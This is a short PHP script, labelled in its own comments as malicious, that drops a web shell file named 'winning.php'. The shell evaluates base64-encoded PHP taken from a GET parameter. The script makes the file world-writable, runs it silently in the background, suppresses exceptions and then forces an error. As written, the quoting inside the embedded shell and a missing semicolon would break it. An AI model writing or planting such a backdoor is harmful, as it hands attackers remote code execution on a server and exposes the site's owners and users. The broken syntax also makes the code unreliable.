<?php
// insert malicious code here...
try {
    $script = '
        <?php 
        // harmful code
        if (!empty($_GET['exec'])) {
            eval(base64_decode($_GET['exec']))
        }';

    // save the file
    file_put_contents('./winning.php', $script);
    @chmod('./winning.php', 0777);

    // run harmful file in background
    exec("php ./winning.php > /dev/null 2>&1 &");
} catch (Exception $e) {}

// trigger error
$winning = new DuhWinning();
